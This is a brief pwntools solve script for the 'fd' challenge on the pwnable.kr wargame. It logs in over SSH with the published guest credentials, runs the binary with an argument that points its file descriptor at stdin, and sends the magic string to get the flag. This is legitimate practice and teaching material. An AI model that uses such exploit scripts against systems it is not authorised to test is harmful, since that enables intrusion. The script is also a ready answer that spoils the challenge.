
from pwn import *
#context.log_level = 'debug'

pwn_ssh = ssh(host='pwnable.kr',user='fd',password='guest',port=2222)

cn = pwn_ssh.process(argv=['fd','4660'],executable='./fd')

cn.sendline('LETMEWIN')
print cn.recv()
